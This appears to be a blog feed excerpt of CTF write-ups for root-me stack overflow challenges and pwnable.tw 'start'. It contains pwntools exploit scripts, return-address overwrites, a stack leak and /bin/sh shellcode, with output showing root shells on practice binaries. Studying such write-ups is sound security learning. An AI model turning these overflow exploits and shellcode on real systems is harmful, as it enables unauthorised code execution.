&lt;h2&gt;exploit&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from pwn import *
p = process('./ch35')
elf = ELF('ch35')
sh = elf.symbols['callMeMaybe']
payload = 'a'*280 + p64(sh)
print payload
p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;run it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt; ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow basic  python exp_ch35.py
[+] Starting local process './ch35': pid 4337
[*] '/mnt/hgfs/pwnexc/root-me/x64 stack overflow basic/ch35'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x06@\x00\x00\x00\x00\x00
[*] Switching to interactive mode
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b
$ id
uid=0(root) gid=0(root) 组=0(root)
$  
&lt;/code&gt;&lt;/pre&gt;</content><author><name>DoubleMice</name></author><category term="root-me" /><summary type="html">x64 stack overflow basic step checksec: Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) use the address of callMeMaybe to cover the return address of strlen calc the distance: Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000400728 in main () gdb-peda$ pattern_offset A%JA%fA%5A A%JA%fA%5A found at offset: 280 exploit from pwn import * p = process('./ch35') elf = ELF('ch35') sh = elf.symbols['callMeMaybe'] payload = 'a'*280 + p64(sh) print payload p.sendline(payload) p.interactive() run it: ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow basic  python exp_ch35.py [+] Starting local process './ch35': pid 4337 [*] '/mnt/hgfs/pwnexc/root-me/x64 stack overflow basic/ch35' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x06@\x00\x00\x00\x00\x00 [*] Switching to interactive mode Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b $ id uid=0(root) gid=0(root) 组=0(root) $</summary></entry><entry><title type="html">root-me:x86 stack overflow basic3</title><link href="http://localhost:4000/root-me/2017/11/29/root_me-x86-stack-overflow-basic3.html" rel="alternate" type="text/html" title="root-me:x86 stack overflow basic3" /><published>2017-11-29T15:39:48+08:00</published><updated>2017-11-29T15:39:48+08:00</updated><id>http://localhost:4000/root-me/2017/11/29/root_me-x86-stack-overflow-basic3</id><content type="html" xml:base="http://localhost:4000/root-me/2017/11/29/root_me-x86-stack-overflow-basic3.html">&lt;h1&gt;x86 stack overflow basic3&lt;/h1&gt;
&lt;h2&gt;general&lt;/h2&gt;
&lt;p&gt;from the code source we found:&lt;br /&gt;
* we could control the index of array &lt;code&gt;buffer&lt;/code&gt; to be a negative value,an important feature of array is that we could read or write the content near the base address of an array.&lt;br /&gt;
* send &lt;code&gt;0x08&lt;/code&gt; to make index value &lt;code&gt;count&lt;/code&gt; point to right area(&lt;code&gt;check&lt;/code&gt;),then send &lt;code&gt;0xbfffabc&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;step&lt;/h2&gt;
&lt;p&gt;locate the &lt;code&gt;check&lt;/code&gt; position:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;char buffer[64];
int check;
int i = 0;
int count = 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;so its stack layout is:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;buffer array           //buffer[8]
buffer array           //buffer[4]
buffer base address   //buffer[0]
check                 //buffer[-4]
i
count                 //low address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;send four bytes &lt;code&gt;\x08&lt;/code&gt; make &lt;code&gt;count&lt;/code&gt; be &lt;code&gt;-4&lt;/code&gt;&lt;br /&gt;
send little endian &lt;code&gt;0xbfffabc&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;exploit&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from pwn import *
p = process('./ch16')
p.recvuntil(':')
p.sendline('\x08'*4 + '\xbc\xfa\xff\xbf')
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;run it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt; ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x86 bof b3  python exp_ch16.py
[+] Starting local process './ch16': pid 3873
[*] Switching to interactive mode
 $ id
uid=0(root) gid=0(root) 组=0(root)
 $ 
&lt;/code&gt;&lt;/pre&gt;</content><author><name>DoubleMice</name></author><category term="root-me" /><summary type="html">x86 stack overflow basic3 general from the code source we found: * we could control the index of array buffer to be a negative value,an important feature of array is that we could read or write the content near the base address of an array. * send 0x08 to make index value count point to right area(check),then send 0xbfffabc step locate the check position: char buffer[64]; int check; int i = 0; int count = 0; so its stack layout is: buffer array //buffer[8] buffer array //buffer[4] buffer base address //buffer[0] check //buffer[-4] i count //low address send four bytes \x08 make count be -4 send little endian 0xbfffabc exploit from pwn import * p = process('./ch16') p.recvuntil(':') p.sendline('\x08'*4 + '\xbc\xfa\xff\xbf') p.interactive() run it: ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x86 bof b3  python exp_ch16.py [+] Starting local process './ch16': pid 3873 [*] Switching to interactive mode $ id uid=0(root) gid=0(root) 组=0(root) $</summary></entry><entry><title type="html">pwn4fun on pwnable.tw</title><link href="http://localhost:4000/pwnable.tw/2017/10/26/pwn4fun-on-pwnable-tw.html" rel="alternate" type="text/html" title="pwn4fun on pwnable.tw" /><published>2017-10-26T17:45:49+08:00</published><updated>2017-10-26T17:45:49+08:00</updated><id>http://localhost:4000/pwnable.tw/2017/10/26/pwn4fun-on-pwnable-tw</id><content type="html" xml:base="http://localhost:4000/pwnable.tw/2017/10/26/pwn4fun-on-pwnable-tw.html">&lt;h2&gt;content&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#start&quot;&gt;start&lt;/a&gt; (Finished on 10/26/2017)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;start&lt;/h2&gt;
&lt;h3&gt;overview&lt;/h3&gt;
&lt;p&gt;just run it,i got:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# ./start
Let's start the CTF:aaa
root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obviously,it receives a string and then exit.&lt;br /&gt;
here are its assamble:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# objdump -d start

start：     文件格式 elf32-i386


Disassembly of section .text:

08048060 &lt;_start&gt;:
 8048060:   54                      push   %esp
 8048061:   68 9d 80 04 08          push   $0x804809d
 8048066:   31 c0                   xor    %eax,%eax
 8048068:   31 db                   xor    %ebx,%ebx
 804806a:   31 c9                   xor    %ecx,%ecx
 804806c:   31 d2                   xor    %edx,%edx
 804806e:   68 43 54 46 3a          push   $0x3a465443
 8048073:   68 74 68 65 20          push   $0x20656874
 8048078:   68 61 72 74 20          push   $0x20747261
 804807d:   68 73 20 73 74          push   $0x74732073
 8048082:   68 4c 65 74 27          push   $0x2774654c
 8048087:   89 e1                   mov    %esp,%ecx
 8048089:   b2 14                   mov    $0x14,%dl
 804808b:   b3 01                   mov    $0x1,%bl
 804808d:   b0 04                   mov    $0x4,%al
 804808f:   cd 80                   int    $0x80
 8048091:   31 db                   xor    %ebx,%ebx
 8048093:   b2 3c                   mov    $0x3c,%dl
 8048095:   b0 03                   mov    $0x3,%al
 8048097:   cd 80                   int    $0x80
 8048099:   83 c4 14                add    $0x14,%esp
 804809c:   c3                      ret    

0804809d &lt;_exit&gt;:
 804809d:   5c                      pop    %esp
 804809e:   31 c0                   xor    %eax,%eax
 80480a0:   40                      inc    %eax
 80480a1:   cd 80                   int    $0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the function &lt;code&gt;write()&lt;/code&gt; is locating at &lt;code&gt;0x8048087&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;check the defense method:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So my idea is:input a string to leak the stack addr,then arrange shellcode,when it return run at 0x804809c its next instruction will point to the shellcode.&lt;/p&gt;
&lt;h3&gt;step&lt;/h3&gt;
&lt;p&gt;the layout of stack:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;gdb-peda$ stack 30
0000| 0xff9e6194 (&quot;Let's start the CTF:3500&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;04\b60a3677&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;01&quot;)
0004| 0xff9e6198 (&quot;s start the CTF:3500&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;04\b60a3677&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;01&quot;)
0008| 0xff9e619c (&quot;art the CTF:3500&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;04\b60a3677&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;01&quot;)
0012| 0xff9e61a0 (&quot;the CTF:3500&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;04\b60a3677&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;01&quot;)
0016| 0xff9e61a4 (&quot;CTF:3500&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;04\b60a3677&lt;pre wp-pre-tag-3&gt;&lt;/pre&gt;01&quot;)
0020| 0xff9e61a8 --&gt; 0x804809d (&lt;_exit&gt;:    pop    esp)
0024| 0xff9e61ac --&gt; 0xff9e61b0 --&gt; 0x1 
0028| 0xff9e61b0 --&gt; 0x1 
0032| 0xff9e61b4 --&gt; 0xff9e646a (&quot;./start&quot;)
0036| 0xff9e61b8 --&gt; 0x0 
0040| 0xff9e61bc --&gt; 0xff9e6472 (&quot;ZEITGEIST_DATA_PATH=/root/.local/share/zeitgeist&quot;)
0044| 0xff9e61c0 --&gt; 0xff9e64a3 (&quot;DBUS_STARTER_ADDRESS=unix:path=/run/user/0/bus,guid=07c6b2741affa1093934fedb59f194c2&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as we could see,when i can create a 24bytes-size string as input,the last 4bytes could cover its return addr(at 0xff9e61a8),if i make &lt;code&gt;0x8048087&lt;/code&gt; cover it,then the function &lt;code&gt;write()&lt;/code&gt; can print 20bytes contents from &lt;code&gt;0xff9e61ac&lt;/code&gt;,as the stack show,one of the stack addr(&lt;code&gt;0xff9e61b0&lt;/code&gt;) locates at &lt;code&gt;0xff9e61ac&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from pwn import *

DEBUG = True
if DEBUG:
    r = process('./start')
else:
    r = remote('chall.pwnable.tw',10000)

get_stack = 'a'*20 + p32(0x8048087)
r.send(get_stack)
r.recvuntil(':')
stack = int(r.recv(4)[::-1].encode('hex'),16)
shellcode = '\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
payload = 'a'*20 + p32(stack+20) + shellcode
r.send(payload)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;run the exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# python exp.py 
[+] Starting local process './start': pid 4274
[*] Switching to interactive mode
\x00\x00\x00j\xa4\x84\xff\x00\x00\x00\x00r\xa4\x84\xff$id
uid=0(root) gid=0(root) groups=0(root)
$  
&lt;/code&gt;&lt;/pre&gt;</content><author><name>DoubleMice</name></author><category term="pwnable.tw" /><summary type="html">content start (Finished on 10/26/2017) start overview just run it,i got: root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# ./start Let's start the CTF:aaa root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# Obviously,it receives a string and then exit. here are its assamble: root@pwn:/mnt/hgfs/pwnexc/pwnable.tw/start# objdump -d start</summary></entry></feed>